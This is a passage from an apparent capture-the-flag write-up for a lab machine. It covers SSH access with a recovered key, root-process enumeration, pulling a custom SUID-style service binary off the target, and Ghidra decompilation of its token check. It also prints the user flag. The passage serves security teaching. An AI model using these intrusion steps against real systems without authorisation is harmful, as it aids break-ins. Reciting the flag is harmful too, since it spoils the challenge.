+</code></pre></div><h2 id=system-enumeration>System enumeration</h2><p>Now we can access the machine via SSH:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>chmod</span> 600 <span class=mtku>id_rsa</span>
+
+<span class=code-cyan>$</span> <span class=code-dark-green>ssh</span> -i <span class=mtku>id_rsa</span> user@10.10.11.157  
+<span class=code-green>user@overgraph</span>:<span class=code-blue>~</span>$ cat user.txt
+09753d50eb14c51fc58b94afb5eedcc3
+</code></pre></div><p>When analyzing processes in execution running as <code>root</code>, we see a weird one:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>user@overgraph</span>:<span class=code-blue>~</span>$ ps -faux | grep root
+...
+<span class=code-red>root</span>        8623  0.0  0.0      0     0 ?        I    14:41   0:00  \_ [kworker/0:2-events]
+<span class=code-red>root</span>        8656  0.0  0.0      0     0 ?        I    14:45   0:00  \_ [kworker/u256:0-events_power_efficient]
+<span class=code-red>root</span>           1  0.0  0.2 103796 11208 ?        Ss   Jul31   0:04 /sbin/init maybe-ubiquity
+<span class=code-red>root</span>         491  0.0  0.4  67848 16268 ?        S&lt;s  Jul31   0:01 /lib/systemd/systemd-journald
+<span class=code-red>root</span>         517  0.0  0.1  21368  5436 ?        Ss   Jul31   0:01 /lib/systemd/systemd-udevd
+<span class=code-red>root</span>         662  0.0  0.4 214596 17944 ?        SLsl Jul31   0:06 /sbin/multipathd -d -s
+<span class=code-red>root</span>         705  0.0  0.2  47540 10608 ?        Ss   Jul31   0:00 /usr/bin/VGAuthService
+<span class=code-red>root</span>         710  0.1  0.2 311508  8332 ?        Ssl  Jul31   0:58 /usr/bin/vmtoolsd
+<span class=code-red>root</span>         711  0.0  0.1  99896  5804 ?        Ssl  Jul31   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0  
+<span class=code-red>root</span>         756  0.0  0.2 239276  9268 ?        Ssl  Jul31   0:01 /usr/lib/accountsservice/accounts-daemon
+<span class=code-red>root</span>         780  0.0  0.0  81956  3788 ?        Ssl  Jul31   0:02 /usr/sbin/irqbalance --foreground
+<span class=code-red>root</span>         787  0.0  0.1  16660  7756 ?        Ss   Jul31   0:00 /lib/systemd/systemd-logind
+<span class=code-red>root</span>         788  0.0  0.3 394876 13472 ?        Ssl  Jul31   0:00 /usr/lib/udisks2/udisksd
+<span class=code-red>root</span>         815  0.0  0.2 236416  9100 ?        Ssl  Jul31   0:00 /usr/lib/policykit-1/polkitd --no-debug
+<span class=code-red>root</span>         932  0.0  0.0   6812  2996 ?        Ss   Jul31   0:00 /usr/sbin/cron -f
+<span class=code-red>root</span>         933  0.0  0.0   8480  3384 ?        S    Jul31   0:00  \_ /usr/sbin/CRON -f
+<span class=code-red>root</span>         934  0.0  0.0   8480  3384 ?        S    Jul31   0:00  \_ /usr/sbin/CRON -f
+<span class=code-red>root</span>         935  0.0  0.0   8352  3356 ?        S    Jul31   0:00  \_ /usr/sbin/CRON -f
+<span class=code-red>root</span>         949  0.0  0.0   2608   536 ?        Ss   Jul31   0:00      \_ /bin/sh -c sh -c 'socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr'
+<span class=code-red>root</span>         950  0.0  0.0   2608   536 ?        S    Jul31   0:00          \_ sh -c socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr
+<span class=code-red>root</span>         951  0.0  0.0   6964  1828 ?        S    Jul31   0:00              \_ socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr
+<span class=code-red>root</span>         964  0.0  0.1  12172  7324 ?        Ss   Jul31   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+<span class=code-red>root</span>        8687  0.0  0.2  13660  8772 ?        Ss   14:46   0:00  \_ sshd: user [priv]
+user        8804  0.0  0.0   6300   656 pts/0    S+   14:48   0:00              \_ grep --color=auto <span class=code-red>root</span>
+<span class=code-red>root</span>         966  0.0  0.0  55276  1564 ?        Ss   Jul31   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
+<span class=code-red>root</span>         970  0.0  0.0   5828  1824 tty1     Ss+  Jul31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+<span class=code-red>root</span>         981  0.0  0.1   6532  5004 ?        Ss   Jul31   0:02 /usr/sbin/apache2 -k start
+</code></pre></div><p>It&rsquo;s this command:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr
+</span></span></code></pre></div><p>The command runs a binary file at <code>/usr/local/bin/Nreport/nreport</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>user@overgraph</span>:<span class=code-blue>~</span>$ file /usr/local/bin/Nreport/nreport
+/usr/local/bin/Nreport/nreport: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/local/bin/Nreport/libc/ld-2.25.so, for GNU/Linux 3.2.0, BuildID[sha1]=fab56bbb7a23ada8a8f5943b527d16f3cdcb09e5, not stripped  
+
+<span class=code-green>user@overgraph</span>:<span class=code-blue>~</span>$ ls -l /usr/local/bin/Nreport/nreport
+-rwxr-xr-x 1 root root 26040 Feb 14 12:30 <span class=code-green>/usr/local/bin/Nreport/nreport
+</code></pre></div><p>It is very likely that we need to exploit this binary to become <code>root</code>. Let&rsquo;s download the binary and analyze it with Ghidra:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>user@overgraph</span>:<span class=code-blue>~</span>$ cd /usr/local/bin/Nreport/
+<span class=code-green>user@overgraph</span>:<span class=code-blue>/usr/local/bin/Nreport</span>$ python3 -m http.server  
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.17.44 - - [] "GET /nreport HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>wget</span> -q 10.10.11.157:8000/nreport  
+</code></pre></div><p>Plus, we might want to download shared libraries used by the binary to have the same working environment as in the remote machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>user@overgraph</span>:<span class=code-blue>/usr/local/bin/Nreport</span>$ ll
+total 40
+drwxr-xr-x 3 root root  4096 Apr 12 17:38 <span class=code-blue>.</span>/
+drwxr-xr-x 3 root root  4096 Apr 12 17:38 <span class=code-blue>..</span>/
+drwxr-xr-x 2 root root  4096 Feb 14 18:31 <span class=code-blue>libc</span>/
+-rwxr-xr-x 1 root root 26040 Feb 14 12:30 <span class=code-green>nreport</span>*
+<span class=code-green>user@overgraph</span>:<span class=code-blue>/usr/local/bin/Nreport</span>$ ll libc/
+total 31716
+drwxr-xr-x 2 root root     4096 Feb 14 18:31 <span class=code-blue>.</span>/
+drwxr-xr-x 3 root root     4096 Apr 12 17:38 <span class=code-blue>..</span>/
+-rwxr-xr-x 1 root root  1250280 Feb 13 14:17 <span class=code-green>ld-2.25.so</span>*
+-rwxr-xr-x 1 root root  1250280 Feb 13 14:17 <span class=code-green>ld.so.2</span>*
+-rwxr-xr-x 1 root root 14979184 Feb 14 18:29 <span class=code-green>libc-2.25.so</span>*
+-rwxr-xr-x 1 root root 14978536 Feb 13 14:17 <span class=code-green>libc.so.6</span>*
+<span class=code-green>user@overgraph</span>:<span class=code-blue>/usr/local/bin/Nreport</span>$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.17.44 - - [01/Aug/2022 15:36:57] "GET /libc/libc.so.6 HTTP/1.1" 200 -
+10.10.17.44 - - [01/Aug/2022 15:37:18] "GET /libc/libc-2.25.so HTTP/1.1" 200 -  
+10.10.17.44 - - [01/Aug/2022 15:37:43] "GET /libc/ld-2.25.so HTTP/1.1" 200 -
+10.10.17.44 - - [01/Aug/2022 15:37:48] "GET /libc/ld.so.2 HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>mkdir</span> libc
+
+<span class=code-cyan>$</span> <span class=code-dark-green>cd</span> <span class=mtku>libc</span>
+
+<span class=code-cyan>$</span> <span class=code-dark-green>wget</span> -q 10.10.11.157:8000/libc/{libc.so.6,libc-2.25.so,ld.so.2,ld-2.25.so}  
+</code></pre></div><p>Using <a href=https://github.com/io12/pwninit><code>pwninit</code></a>, we can patch the binary so that it uses the specific shared library and loader indicated:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>pwninit</span> --libc <span class=mtku>libc/libc.so.6</span> --ld <span class=mtku>libc/ld.so.2</span> --bin <span class=mtku>nreport</span> --no-template
+<span class=code-dark-blue>bin</span>: <span class=code-blue>nreport</span>
+<span class=code-dark-yellow>libc</span>: <span class=code-yellow>libc/libc.so.6</span>
+<span class=code-dark-green>ld</span>: <span class=code-green>libc/ld.so.2</span>
+
+<span class=code-magenta>warning: failed detecting libc version (is the libc an Ubuntu glibc?): failed finding version string</span>  
+<span class=code-dark-green>copying <span class=code-green>nreport<span class=code-dark-green> to <span class=code-green>nreport_patched</span>
+<span class=code-dark-green>running patchelf on <span class=code-green>nreport_patched
+</code></pre></div><h2 id=analyzing-the-nreport-binary>Analyzing the <code>nreport</code> binary</h2><p>This is the <code>main</code> function:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">void</span><span class=mtk1> </span><span class=mtk8>main</span><span class=mtk1>() {</span>
+<span class=mtk1>  </span><span class="mtk7 mtki">int</span><span class=mtk1> iVar1;</span>
+<span class=mtk1>  </span><span class="mtk7 mtki">long</span><span class=mtk1> in_FS_OFFSET;</span>
+<span class=mtk1>  </span><span class="mtk7 mtki">char</span><span class=mtk1> option[</span><span class=mtk6>3</span><span class=mtk1>];</span>
+<span class=mtk1>  undefined8 canary;</span>
+<span class=mtk1>  </span>
+<span class=mtk1>  canary </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>(undefined8 </span><span class=mtk5>*</span><span class=mtk1>) (in_FS_OFFSET </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>28</span><span class=mtk1>);</span>
+<span class=mtk1>  </span><span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Custom Reporting v1</span><span class=mtk6>\n</span><span class=mtk4>"</span><span class=mtk1>);</span>
+<span class=mtk1>  </span><span class=mtk8>auth</span><span class=mtk1>();</span>
+<span class=mtk1>  </span><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>\n</span><span class=mtk4>Welcome </span><span class=mtk6>%s</span><span class=mtk4>"</span><span class=mtk1>, userinfo1);</span>
+
+<span class=mtk1>  </span><span class=mtk5>do</span><span class=mtk1> {</span>
+<span class=mtk1>    </span><span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>\n</span><span class=mtk4>1.Create New Message</span><span class=mtk6>\n</span><span class=mtk4>2.Delete a Message</span><span class=mtk6>\n</span><span class=mtk4>3.Edit Messages</span><span class=mtk6>\n</span><span class=mtk4>4.Report All Messages</span><span class=mtk6>\n</span><span class=mtk4>5.Exit"</span><span class=mtk1>);</span>  
+<span class=mtk1>    </span><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"&gt; "</span><span class=mtk1>);</span>
+<span class=mtk1>    </span><span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>" </span><span class=mtk10>%</span><span class=mtk4>1[^</span><span class=mtk6>\n</span><span class=mtk4>]"</span><span class=mtk1>, option);</span>
+<span class=mtk1>    iVar1 </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk8>atoi</span><span class=mtk1>(option);</span>
+
+<span class=mtk1>    </span><span class=mtk5>switch</span><span class=mtk1> (iVar1) {</span>
+<span class=mtk1>    </span><span class=mtk5>case</span><span class=mtk1> </span><span class=mtk6>1</span><span class=mtk1>:</span>
+<span class=mtk1>      </span><span class=mtk8>create</span><span class=mtk1>();</span>
+<span class=mtk1>      </span><span class=mtk5>break</span><span class=mtk1>;</span>
+<span class=mtk1>    </span><span class=mtk5>case</span><span class=mtk1> </span><span class=mtk6>2</span><span class=mtk1>:</span>
+<span class=mtk1>      </span><span class=mtk8>delete</span><span class=mtk1>();</span>
+<span class=mtk1>      </span><span class=mtk5>break</span><span class=mtk1>;</span>
+<span class=mtk1>    </span><span class=mtk5>case</span><span class=mtk1> </span><span class=mtk6>3</span><span class=mtk1>:</span>
+<span class=mtk1>      </span><span class=mtk8>edit</span><span class=mtk1>();</span>
+<span class=mtk1>      </span><span class=mtk5>break</span><span class=mtk1>;</span>
+<span class=mtk1>    </span><span class=mtk5>case</span><span class=mtk1> </span><span class=mtk6>4</span><span class=mtk1>:</span>
+<span class=mtk1>      </span><span class=mtk8>report</span><span class=mtk1>();</span>
+<span class=mtk1>      </span><span class=mtk5>break</span><span class=mtk1>;</span>
+<span class=mtk1>    </span><span class=mtk5>case</span><span class=mtk1> </span><span class=mtk6>5</span><span class=mtk1>:</span>
+<span class=mtk1>      </span><span class=mtk8>system</span><span class=mtk1>(userinfo1 </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>28</span><span class=mtk1>);</span>
+<span class=mtk3>                    /* WARNING: Subroutine does no</span><span class=mtk3>t return */</span>
+<span class=mtk1>      </span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
+<span class=mtk1>    }</span>
+<span class=mtk1>  } </span><span class=mtk5>while</span><span class=mtk1> (</span><span class=mtk6>true</span><span class=mtk1>);</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>The first thing that it does is call <code>auth</code> to request a token:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>user@overgraph</span>:<span class=code-blue>/usr/local/bin/Nreport</span>$ ./nreport  
+Custom Reporting v1
+
+Enter Your Token: 1234
+Invalid Token
+</code></pre></div><p>This is the <code>auth</code> function:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">void</span><span class=mtk1> </span><span class=mtk8>auth</span><span class=mtk1>() {</span>
+<span class=mtk1>  </span><span class="mtk7 mtki">size_t</span><span class=mtk1> sVar1;</span>
+<span class=mtk1>  </span><span class="mtk7 mtki">long</span><span class=mtk1> in_FS_OFFSET;</span>
+<span class=mtk1>  </span><span class="mtk7 mtki">int</span><span class=mtk1> i;</span>
+<span class=mtk1>  undefined8 local_48;</span>
+<span class=mtk1>  undefined8 local_40;</span>
+<span class=mtk1>  undefined8 local_38;</span>
+<span class=mtk1>  undefined8 local_30;</span>
+<span class=mtk1>  undefined8 local_28;</span>
+<span class=mtk1>  undefined8 local_20;</span>
+<span class=mtk1>  undefined8 local_18;</span>
+<span class=mtk1>  </span><span class="mtk7 mtki">long</span><span class=mtk1> canary;</span>
+<span class=mtk1>  </span>
+<span class=mtk1>  canary </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">long</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>) (in_FS_OFFSET </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>28</span><span class=mtk1>);</span>
+<span class=mtk1>  local_48 </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk6>0</span><span class=mtk1>;</span>
+<span class=mtk1>  local_40 </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk6>0</span><span class=mtk1>;</span>
+<span class=mtk1>  local_38 </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk6>0</span><span class=mtk1>;</span>
+<span class=mtk1>  local_30 </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk6>0</span><span class=mtk1>;</span>
+<span class=mtk1>  local_28 </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk6>0</span><span class=mtk1>;</span>
+<span class=mtk1>  local_20 </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk6>0</span><span class=mtk1>;</span>
+<span class=mtk1>  local_18 </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk6>0</span><span class=mtk1>;</span>
+<span class=mtk1>  </span><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Enter Your Token: "</span><span class=mtk1>);</span>
+<span class=mtk1>  </span><span class=mtk8>fgets</span><span class=mtk1>(userinfo1 </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>78</span><span class=mtk1>,</span> <span class=mtk6>19</span><span class=mtk1>, stdin);</span>
+<span class=mtk1>  sVar1 </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk8>strlen</span><span class=mtk1>(userinfo1 </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>78</span><span class=mtk1>);</span>
+
+<span class=mtk1>  </span><span class=mtk5>if</span><span class=mtk1> (sVar1 </span><span class=mtk5>!=</span><span class=mtk1> </span><span class=mtk6>15</span><span class=mtk1>) {</span>
+<span class=mtk1>    </span><span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Invalid Token"</span><span class=mtk1>);</span>
+<span class=mtk3>                    /* WARNING: Subroutine does no</span><span class=mtk3>t return */</span>
+<span class=mtk1>    </span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
+<span class=mtk1>  }</span>
+
+<span class=mtk1>  </span><span class=mtk5>for</span><span class=mtk1> (i </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk6>13</span><span class=mtk1>; </span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1> </span><span class=mtk5>&lt;</span><span class=mtk1> i; i </span><span class=mtk5>=</span><span class=mtk1> i </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>) {</span>
+<span class=mtk1>    </span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">uint</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>) ((</span><span class="mtk7 mtki">long</span><span class=mtk1>) </span><span class=mtk5>&amp;</span><span class=mtk1>local_48 </span><span class=mtk5>+</span><span class=mtk1> (</span><span class="mtk7 mtki">long</span><span class=mtk1>) i </span><span class=mtk5>*</span><span class=mtk1> </span><span class=mtk6>4</span><span class=mtk1>) </span><span class=mtk5>=</span>
+<span class=mtk1>         </span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">uint</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>) (secret </span><span class=mtk5>+</span><span class=mtk1> (</span><span class="mtk7 mtki">long</span><span class=mtk1>) i </span><span class=mtk5>*</span><span class=mtk1> </span><span class=mtk6>4</span><span class=mtk1>) </span><span class=mtk5>^</span><span class=mtk1> (</span><span class="mtk7 mtki">int</span><span class=mtk1>) userinfo1[</span><span class=mtk6>121</span><span class=mtk1>] </span><span class=mtk5>^</span><span class=mtk1> (</span><span class="mtk7 mtki">int</span><span class=mtk1>) userinfo1[</span><span class=mtk6>122</span><span class=mtk1>] </span><span class=mtk5>^</span>  
+<span class=mtk1>         (</span><span class="mtk7 mtki">int</span><span class=mtk1>) userinfo1[</span><span class=mtk6>120</span><span class=mtk1>] </span><span class=mtk5>^</span><span class=mtk1> (</span><span class="mtk7 mtki">int</span><span class=mtk1>) userinfo1[</span><span class=mtk6>129</span><span class=mtk1>] </span><span class=mtk5>^</span><span class=mtk1> (</span><span class="mtk7 mtki">int</span><span class=mtk1>) userinfo1[</span><span class=mtk6>133</span><span class=mtk1>];</span>
+<span class=mtk1>  }</span>
+
+<span class=mtk1>  </span><span class=mtk5>if</span><span class=mtk1> ((</span><span class="mtk7 mtki">int</span><span class=mtk1>) local_40 </span><span class=mtk5>+</span><span class=mtk1> (</span><span class="mtk7 mtki">int</span><span class=mtk1>) local_48 </span><span class=mtk5>+</span><span class=mtk1> local_48._4_4_ </span><span class=mtk5>!=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>134</span><span class=mtk1>) {</span>
+<span class=mtk1>    </span><span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Invalid Token"</span><span class=mtk1>);</span>
+<span class=mtk3>                    /* WARNING: Subroutine does no</span><span class=mtk3>t return */</span>
+<span class=mtk1>    </span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
+<span class=mtk1>  }</span>
+
+<span class=mtk1>  </span><span class=mtk5>if</span><span class=mtk1> (local_28._4_4_ </span><span class=mtk5>+</span><span class=mtk1> local_30._4_4_ </span><span class=mtk5>+</span><span class=mtk1> (</span><span class="mtk7 mtki">int</span><span class=mtk1>) local_28 </span><span class=mtk5>!=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>145</span><span class=mtk1>) {</span>
+<span class=mtk1>    </span><span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Invalid Token"</span><span class=mtk1>);</span>
+<span class=mtk3>                    /* WARNING: Subroutine does no</span><span class=mtk3>t return */</span>
+<span class=mtk1>    </span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
+<span class=mtk1>  }</span>
+
+<span class=mtk1>  </span><span class=mtk5>if</span><span class=mtk1> (local_18._4_4_ </span><span class=mtk5>+</span><span class=mtk1> local_20._4_4_ </span><span class=mtk5>+</span><span class=mtk1> (</span><span class="mtk7 mtki">int</span><span class=mtk1>) local_18 </span><span class=mtk5>!=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>109</span><span class=mtk1>) {</span>
+<span class=mtk1>    </span><span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Invalid Token"</span><span class=mtk1>);</span>
+<span class=mtk3>                    /* WARNING: Subroutine does no</span><span class=mtk3>t return */</span>
+<span class=mtk1>    </span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
+<span class=mtk1>  }</span>
+
+<span class=mtk1>  </span><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Enter Name: "</span><span class=mtk1>);</span>
+<span class=mtk1>  </span><span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>" </span><span class=mtk10>%</span><span class=mtk4>39[^</span><span class=mtk6>\n</span><span class=mtk4>]"</span><span class=mtk1>, userinfo1);</span>
+<span class=mtk1>  userinfo1._140_8_ </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>7672632f74706f2f</span><span class=mtk1>;</span>
+<span class=mtk1>  userinfo1._148_2_ </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>2f31</span><span class=mtk1>;</span>
+<span class=mtk1>  userinfo1[</span><span class=mtk6>150</span><span class=mtk1>] </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk6>0</span><span class=mtk1>;</span>
+<span class=mtk1>  </span><span class=mtk8>strcat</span><span class=mtk1>(userinfo1 </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>8c</span><span class=mtk1>, userinfo1);</span>
+<span class=mtk1>  userinfo1._40_8_ </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>614c22206f686365</span><span class=mtk1>;</span>
+<span class=mtk1>  userinfo1._48_8_ </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>2064657355207473</span><span class=mtk1>;</span>
+<span class=mtk1>  userinfo1._56_8_ </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>7461642824206e4f</span><span class=mtk1>;</span>
+<span class=mtk1>  userinfo1._64_8_ </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>2f203e3e20222965</span><span class=mtk1>;</span>
+<span class=mtk1>  userinfo1._72_8_ </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>2f676f6c2f726176</span><span class=mtk1>;</span>
+<span class=mtk1>  userinfo1._80_8_ </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>74726f7065726b</span><span class=mtk1>;</span>
+
+<span class=mtk1>  </span><span class=mtk5>if</span><span class=mtk1> (canary </span><span class=mtk5>!=</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">long</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>) (in_FS_OFFSET </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>28</span><span class=mtk1>)) {</span>
+<span class=mtk3>                    /* WARNING: Subroutine does no</span><span class=mtk3>t return */</span>
+<span class=mtk1>    </span><span class=mtk8>__stack_chk_fail</span><span class=mtk1>();</span>
+<span class=mtk1>  }</span>
+
+<span class=mtk1>  userinfo1._40_8_ </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>614c22206f686365</span><span class=mtk1>;</span>
+<span class=mtk1>  userinfo1._48_8_ </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>2064657355207473</span><span class=mtk1>;</span>
+<span class=mtk1>  userinfo1._56_8_ </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>7461642824206e4f</span><span class=mtk1>;</span>
+<span class=mtk1>  userinfo1._64_8_ </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>2f203e3e20222965</span><span class=mtk1>;</span>
+<span class=mtk1>  userinfo1._72_8_ </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>2f676f6c2f726176</span><span class=mtk1>;</span>
+<span class=mtk1>  userinfo1._80_8_ </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>74726f7065726b</span><span class=mtk1>;</span>
+
+<span class=mtk1>  </span><span class=mtk5>return</span><span class=mtk1>;</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>The first thing we need to do is craft a token that passes all checks:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>  </span><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Enter Your Token: "</span><span class=mtk1>);</span>
+<span class=mtk1>  </span><span class=mtk8>fgets</span><span class=mtk1>(userinfo1 </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk6>120</span><span class=mtk1>,</span> <span class=mtk6>19</span><span class=mtk1>, stdin);</span>
+<span class=mtk1>  sVar1 </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk8>strlen</span><span class=mtk1>(userinfo1 </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk6>120</span><span class=mtk1>);</span>
+
+<span class=mtk1>  </span><span class=mtk5>if</span><span class=mtk1> (sVar1 </span><span class=mtk5>!=</span><span class=mtk1> </span><span class=mtk6>15</span><span class=mtk1>) {</span>
+<span class=mtk1>    </span><span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Invalid Token"</span><span class=mtk1>);</span>
+<span class=mtk3>                    /* WARNING: Subroutine does no</span><span class=mtk3>t return */</span>
+<span class=mtk1>    </span><span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
+<span class=mtk1>  }</span>
+
+<span class=mtk1>  </span><span class=mtk5>for</span><span class=mtk1> (i </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk6>13</span><span class=mtk1>; </span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1> </span><span class=mtk5>&lt;</span><span class=mtk1> i; i </span><span class=mtk5>=</span><span class=mtk1> i </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>) {</span>
